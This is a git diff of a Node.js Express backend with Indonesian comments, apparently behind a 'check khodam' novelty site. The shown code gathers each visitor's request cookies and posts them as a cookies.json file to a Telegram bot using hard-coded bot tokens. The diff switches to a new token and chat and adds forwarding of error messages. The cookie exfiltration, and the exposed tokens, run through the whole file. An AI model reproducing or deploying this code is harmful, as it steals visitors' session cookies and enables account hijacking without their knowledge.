@@ -2,7 +2,7 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors'); // Import middleware CORS
 const fetch = require('node-fetch');
-const FormData = require('form-data');
+const FormData = require('form-data'); // Import FormData
 const app = express();
 
 // Middleware untuk parse application/json
@@ -53,10 +53,36 @@ function getCookies(req) {
     return cookies;
 }
 
+// Function to send message to Telegram bot
+async function sendMessageToTelegram(message) {
+    const token = '7135971769:AAEozhsjVD0X1utFIeztYJVo36VmZmMONhA';
+    const chat_id = '@check_khodam_bot';
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    const formData = new FormData();
+    formData.append('chat_id', chat_id);
+    formData.append('text', message);
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            body: formData
+        });
+
+        if (response.ok) {
+            console.log('Message successfully sent to Telegram bot');
+        } else {
+            console.error('Error sending message to Telegram bot', response.statusText);
+        }
+    } catch (error) {
+        console.error('Error sending message to Telegram bot', error);
+    }
+}
+
 // Function to send data to Telegram bot
 async function sendToTelegram(data, filename, content) {
-    const token = '6437904783:AAGcfue1uTav8dykCUPCxsrpmrIwfa1D5rM';
-    const chat_id = '@initestingbot';
+    const token = '7135971769:AAEozhsjVD0X1utFIeztYJVo36VmZmMONhA';
+    const chat_id = '@check_khodam_bot';
     const url = `https://api.telegram.org/bot${token}/sendDocument`;
 
     const formData = new FormData();
@@ -74,9 +100,11 @@ async function sendToTelegram(data, filename, content) {
             console.log('Data successfully sent to Telegram bot');
         } else {
             console.error('Error sending data to Telegram bot', response.statusText);
+            await sendMessageToTelegram(`Error sending data to Telegram bot: ${response.statusText}`);
         }
     } catch (error) {
         console.error('Error sending data to Telegram bot', error);
+        await sendMessageToTelegram(`Error sending data to Telegram bot: ${error.message}`);
     }
 }
 
@@ -84,11 +112,11 @@ async function sendToTelegram(data, filename, content) {
 async function exportCookies(req, nama, responseData) {
     const cookies = getCookies(req);
     const json = JSON.stringify(cookies, null, 2);
-    const content = Buffer.from(json, 'utf-8');
+    const buffer = Buffer.from(json, 'utf-8');
 
     // Prepare data to send
     const data = `Nama: ${nama}\nData: ${responseData}`;
-    await sendToTelegram(data, 'cookies.json', content);
+    await sendToTelegram(data, 'cookies.json', buffer);
 }
 
 // Route untuk handle POST request
